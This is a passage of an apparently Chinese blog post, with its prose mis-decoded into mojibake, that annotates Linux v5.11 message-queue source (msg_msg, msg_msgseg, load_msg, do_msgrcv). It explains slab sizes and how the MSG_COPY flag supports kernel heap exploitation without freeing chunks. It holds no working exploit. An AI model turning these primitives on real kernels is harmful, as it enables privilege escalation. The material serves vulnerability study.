<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚</span></span><br><span class="line">    <span class="comment">//ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚</span></span><br><span class="line">    <span class="comment">//æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024</span></span><br><span class="line">    <span class="comment">//è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//ä¸çŸ¥é“å¹²å•¥çš„</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg-&gt;nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª<code>struct msg_msgseg*</code>æŒ‡é’ˆ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="ç›¸å…³å†…å­˜ç»“æ„ï¼š"   >
          <a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="headerlink" title="ç›¸å…³å†…å­˜ç»“æ„ï¼š"></a>ç›¸å…³å†…å­˜ç»“æ„ï¼š</h6>
      <p>åœ¨ä¸€ä¸ª<code>msg_queue</code>é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>ä¸€æ¡æ¶ˆæ¯ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>ä¸¤æ¡æ¶ˆæ¯ï¼š</p>
<p>ä»¥<code>msg_queue</code>çš„<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="æœªå‘½åæ–‡ä»¶"></p>
</li>
</ul>
<p>åŒç†ï¼ŒåŒä¸€ä¸ª<code>msg_queue</code>æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„</p>

        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li>ä½¿ç”¨<code>msgget()</code>å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„<code>msg_msgseg</code>ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„<code>id</code>æ ‡å¿—<code>queue_id</code><ul>
<li><code>msg_msgseg</code>ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ<code>kmalloc-256</code>ã€‚</li>
<li>å…¶<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</li>
</ul>
</li>
<li>æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—<code>queue_id</code>ä¸‹è°ƒç”¨<code>msgsnd()</code>å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msg</code>ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº<code>0x400-0x30</code>å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„<ul>
<li><code>msg_msg</code>ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸<code>msg_queue</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸<code>msg_msgseg</code>å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº<code>kmalloc-64</code>è‡³<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨<code>msg_msg</code>å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º<code>0x400</code>ï¼Œå±äº<code>kmalloc-16</code>è‡³<code>kmalloc-1024</code>ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„ã€‚</li>
</ul>
</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶"   >
          <a href="#B-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>è°ƒç”¨å®Œ<code>alloc_msg()</code>å‡½æ•°åï¼Œå›åˆ°<code>load_msg()</code>å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾"   >
          <a href="#â‘¡é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>é¦–å…ˆå…³æ³¨ä¸€ä¸‹<code>do_msgrcv()</code>å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†</span></span><br><span class="line">        <span class="comment">//ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤</span></span><br><span class="line">    <span class="comment">//åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"   >
          <a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="headerlink" title="A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"></a>A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–</h5>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>msg_msg</code>è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ<code>MSG_COPY</code>è¿™ä¸ª<code>msgflg</code>æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„<code>unlink</code>è§¦å‘é”™è¯¯ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®<code>CONFIG_CHECKPOINT_RESTORE=y</code>æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span 